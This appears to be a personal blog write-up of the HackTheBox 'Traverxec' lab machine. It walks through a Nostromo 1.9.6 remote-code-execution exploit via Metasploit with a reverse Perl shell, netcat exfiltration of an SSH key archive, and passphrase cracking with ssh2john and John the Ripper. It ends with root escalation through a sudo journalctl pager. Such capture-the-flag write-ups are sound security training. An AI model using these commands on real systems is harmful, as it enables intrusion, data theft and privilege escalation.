---
title: "Traverxec Writeup – HackTheBox"
date: 2020-01-01
tags: [HackTheBox, Penetration Testing]
header:
excerpt: "Hack The Box, Penetration Testing"
mathjax: "true"
---


<img src="/images/Traverxec-Writeup/Traverxec.png" style="display: block; margin: auto;" />

# Scanning

```bash 
nmap -sV -A -sC -T4 -v 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-07 17:57 EST
Nmap scan report for 10.10.10.165
Host is up (0.12s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 34.455 days (since Sun Nov  3 07:03:30 2019)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   116.76 ms 10.10.14.1
2   117.07 ms 10.10.10.165
```

It seems that we have a web server called “Nostromo”. For more information here: http://www.nazgul.ch/dev_nostromo.html.

After searching on the web, I found out a Metasploit exploitation module for the Nostromo 1.9.6. Try to run Metasploit and search on nostromo 1.9.6. You will find the module exploit/multi/http/nostromo_code_exec

``` bash 
msf5 > search nostromo 1.9.6

Matching Modules
================

   #  Name                                       Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   0  exploit/multi/http/nostromo_code_exec      2019-10-20       good    Yes    Nostromo Directory Traversal Remote Command Ex

msf5 > use exploit/multi/http/nostromo_code_exec 

msf5 exploit(multi/http/nostromo_code_exec) > show options 

Module options (exploit/multi/http/nostromo_code_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)
   ```

Set the module options (remote host, local host) then run the exploit.

<img src="/images/Traverxec-Writeup/1.png" style="display: block; margin: auto;" />

After while, we find the user “david” under the (/home) directory, but its appear that we need a special permission to list the content of that directory.

<img src="/images/Traverxec-Writeup/2.png" style="display: block; margin: auto;" />


If we look at the configuration server path (/var/nostromo/conf), we could find a file called “nhttpd.conf”, and from it’s name we can guess that is the web server configuration file.


``` bash 
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]
servername     traverxec.htb
serverlisten      *
serveradmin    david@traverxec.htb
serverroot     /var/nostromo
servermimes    conf/mimes
docroot        /var/nostromo/htdocs
docindex    index.html
# LOGS [OPTIONAL]
logpid         logs/nhttpd.pid
 
# SETUID [RECOMMENDED]
user        www-data
# BASIC AUTHENTICATION [OPTIONAL]
htaccess    .htaccess
htpasswd    /var/nostromo/conf/.htpasswd
# ALIASES [OPTIONAL]
/icons         /var/nostromo/icons
# HOMEDIRS [OPTIONAL]
homedirs    /home
homedirs_public      public_www
```

After some inspection, we can tell that there is two types of home directories, and one of them which is “public_www” refer to “Public Directory”. lets try and list the content of the “public_www” directory under David home directory (/home/david/public_www).

``` bash
www-data@traverxec:/$ ls -alh /home/david/public_www
ls -alh /home/david/public_www
total 16K
drwxr-xr-x 3 david david 4.0K Oct 25 15:45 .
drwx--x--x 5 david david 4.0K Oct 25 17:02 ..
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4.0K Oct 25 17:02 protected-file-area
```

There is an interesting directory called “protected-file-area”, lets see what we have there.
``` bash
www-data@traverxec:/$ ls /home/david/public_www/protected-file-area
ls /home/david/public_www/protected-file-area
backup-ssh-identity-files.tgz
```

We found a compressed file called “backup-ssh-identity-files.tgz”, which is definitely a file that we want gets our hands on it. We need to send the file to our machine since we can not uncompressing the file inside the box.


We will send it via Netcat. In the box use the command:

``` bash
nc <Your IP> <port> < backup-ssh-identity-files.tgz //in the Box
nc -l -p <port> > backup-ssh-identity-files.tgz //in your machine

```

<img src="/images/Traverxec-Writeup/3.png" style="display: block; margin: auto;" />

``` bash
root@kali:~/Desktop/HackTheBox/Traverxec# tar xvzf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

After decompress the file, We will find private and public ssh keys. Try access the machine via SSH using David user account and the aforementioned SSH private key.

``` bash
root@kali:~/Desktop/HackTheBox/Traverxec# ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa': 
```

A passphrase is needed to access the machine. We will try to crack it by JohnTheRipper tool. First of all, we need to convert the ssh key to a hash that the JTR tool can crack. We will use “ssh2john” script for that. To find the script’s path, run the command “locate ssh2john”.

``` bash
/usr/share/john/ssh2john.py <Private_Key> > Hash_File
```

<img src="/images/Traverxec-Writeup/4.png" style="display: block; margin: auto;" />

Now we will use JohnTheRipper tool to crack the converted hash.

``` bash
root@kali:~/Desktop/HackTheBox/Traverxec# john hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
hunter           (id_rsa)
Proceeding with incremental:ASCII
1g 0:00:00:05  3/3 0.1869g/s 2016Kp/s 2016Kc/s 2016KC/s mimpsox
Session aborted
```

<img src="/images/Traverxec-Writeup/5.png" style="display: block; margin: auto;" />

# Root

``` bash
david@traverxec:~$ pwd
/home/david
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cd bin/
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
```

Now we are in the David’s home directory. We found (/Bin) directory which have a bash script. Lets look into it.

``` bash
#!/bin/bash
 
cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

This script is to check the status of the nostromo server. From the last line, we can tell that the script will print the last 5 line of the nostromo status log. For more about journalctl: https://www.linode.com/docs/quick-answers/linux/how-to-use-journalctl/

When we execute the last line of the script:

``` bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

It will display the last 5 line of the log normally. But if we execute it without the “cat” after the pipeline:

``` bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

<img src="/images/Traverxec-Writeup/6.png" style="display: block; margin: auto;" />

The log will be displayed in Vim terminal that will be run with root permission, which we can take advantage of it by escalating the privilege to root. Looking into GTFOBins page https://gtfobins.github.io/gtfobins/systemctl/, we found an interesting way to escalate privileges to root.

Simply, execute “!/bin/bash” at the bottom of the terminal, as it will be executed as root to get root bash terminal.

<img src="/images/Traverxec-Writeup/7.png" style="display: block; margin: auto;" />

And we got root!

<img src="/images/Traverxec-Writeup/8.png" style="display: block; margin: auto;" />

